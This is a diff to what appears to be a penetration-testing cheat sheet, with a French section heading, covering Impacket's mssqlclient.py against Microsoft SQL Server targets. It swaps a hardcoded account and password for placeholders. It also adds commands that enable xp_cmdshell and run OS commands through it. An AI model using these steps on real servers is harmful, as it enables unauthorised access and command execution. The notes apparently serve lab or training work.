@@ -125,7 +125,10 @@ mssqlclient.py -p 1433  $USER:$PASS@$TARGET_IP
 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 
 # Local workstation account authentication (no need to add WIN-02 to hosts)
-mssqlclient.py -p 1433 -windows-auth WIN-02/mssqlsvc:princess1@$TARGET_IP      
+mssqlclient.py -p 1433 -windows-auth $AD_DOMAIN$/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
+
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami /priv
 ```
 
 ## Commandes utiles
